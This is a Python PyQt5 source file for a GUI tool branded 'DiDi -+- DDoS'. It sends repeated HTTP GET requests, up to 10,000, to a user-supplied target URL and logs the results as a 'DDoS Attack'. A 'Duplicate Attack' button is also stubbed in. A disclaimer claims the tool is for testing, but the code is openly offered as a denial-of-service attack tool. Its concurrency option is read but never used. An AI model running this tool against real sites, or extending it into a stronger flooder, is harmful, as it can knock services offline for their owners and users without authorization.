import sys
import requests
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QFormLayout, QPushButton, QLabel, QLineEdit, QSpinBox, QPlainTextEdit, QTabWidget
from PyQt5.QtGui import QPalette, QColor
from PyQt5.QtCore import Qt, pyqtSignal, QThread, QTimer
from datetime import datetime
from qdarkstyle import load_stylesheet_pyqt5

app = QApplication(sys.argv)
app.setStyleSheet(load_stylesheet_pyqt5())

class DDoSTesterApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.thread = None
        self.server_status = "Unknown"  # Initialize server status
        self.ping_timer = QTimer()
        self.ping_timer.timeout.connect(self.update_server_status)
        self.ping_timer.start(5000)  # Update server status every 5 seconds

    def initUI(self):
        self.setWindowTitle('DiDi -+- DDos')
        self.setGeometry(100, 100, 800, 400)

        tab_widget = QTabWidget()
        self.setCentralWidget(tab_widget)

        # Tab 1: Test Configuration
        config_widget = QWidget()
        config_layout = QVBoxLayout()

        form_layout = QFormLayout()
        self.url_label = QLabel('Target URL:')
        self.url_input = QLineEdit(self)
        self.url_input.setText("https://example.com")
        self.num_requests_label = QLabel('Number of Requests:')
        self.num_requests_input = QSpinBox(self)
        self.concurrency_label = QLabel('Concurrency (threads):')
        self.concurrency_input = QSpinBox(self)
        form_layout.addRow(self.url_label, self.url_input)
        form_layout.addRow(self.num_requests_label, self.num_requests_input)
        form_layout.addRow(self.concurrency_label, self.concurrency_input)
        self.num_requests_input.setMaximum(10000)  # Set a maximum of 10,000 requests

        # Add the server status button to the form layout
        self.server_status_button = QPushButton('Server Status: Unknown')
        form_layout.addRow(self.server_status_button)

        start_button = QPushButton('Start Test')
        start_button.clicked.connect(self.start_ddos)

        config_layout.addLayout(form_layout)
        config_layout.addWidget(start_button)
        config_widget.setLayout(config_layout)
        tab_widget.addTab(config_widget, "Configuration")

        # Tab 2: Other Features
        extra_features = ExtraFeatures()
        tab_widget.addTab(extra_features, "Other Features")

        self.console_window = ConsoleWindow()
        tab_widget.addTab(self.console_window, "Console")

    def start_ddos(self):
        url = self.url_input.text()
        num_requests = self.num_requests_input.value()
        concurrency = self.concurrency_input.value()

        if self.thread is not None and self.thread.isRunning():
            self.console_window.clear_console()  # Clear the console before starting a new attack

        # Automatically switch to the console tab
        self.centralWidget().setCurrentIndex(self.centralWidget().indexOf(self.console_window))

        self.console_window.update_console("""

####################   D i D i   - + -   D D o S   ####################
                                        
                          

Please use this software Responsibly.                                            
This software was made for the purposes of testing.                                         
The Creator of this software is not responsible for any actions that users intent to do with it.                                        
Please Note That is Ilegal to make DDoS Attacks on servers not autorized for testing. 
\n""")
        self.console_window.update_console("Starting DDoS Attack...\n")

        self.thread = DDoSTesterThread(url, num_requests, concurrency)
        self.thread.results_updated.connect(self.console_window.update_console)
        self.thread.finished.connect(self.on_thread_finished)
        self.thread.start()

    def on_thread_finished(self):
        self.console_window.update_console("Finished.\n")
        self.console_window.update_console("Thank you for using DiDi -+- DDoS\n")

    def update_server_status(self):
        server_url = self.url_input.text()
        response = requests.get(server_url)

        if response.status_code == 200:
            self.server_status = "Connected"
            self.server_status_button.setStyleSheet("background-color: green")
        elif response.status_code == 403:
            self.server_status = "Forbidden"
            self.server_status_button.setStyleSheet("background-color: red")
        else:
            self.server_status = "Unknown"
            self.server_status_button.setStyleSheet("background-color: orange")

        self.server_status_button.setText(f'Server Status: {self.server_status}')

    def closeEvent(self, event):
        if self.thread is not None and self.thread.isRunning():
            self.thread.quit()
            self.thread.wait()
        event.accept()

class ConsoleWindow(QPlainTextEdit):
    update_console_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.initUI()
        self.setReadOnly(True)

    def initUI(self):
        app.setStyle('Fusion')
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(dark_palette)

    def clear_console(self):
        self.clear()

    def update_console(self, message):
        self.appendPlainText(message)

class ExtraFeatures(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()
        add_threads_button = QPushButton("Duplicate Attack")
        layout.addWidget(add_threads_button)
        self.setLayout(layout)

class DDoSTesterThread(QThread):
    results_updated = pyqtSignal(str)

    def __init__(self, url, num_requests, concurrency):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.concurrency = concurrency

    def run(self):
        def send_request(url):
            try:
                response = requests.get(url)
                return response.status_code
            except Exception as e:
                return f"Error: {str(e)}"

        results = []
        for _ in range(self.num_requests):
            result = send_request(self.url)
            results.append(result)
            self.results_updated.emit(f"[{datetime.now()}] {result}\n")

        self.results_updated.emit("DDoS attack finished.\n")
        self.results_updated.emit("using DiDi -+- DDoS\n")

def main():
    window = DDoSTesterApp()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
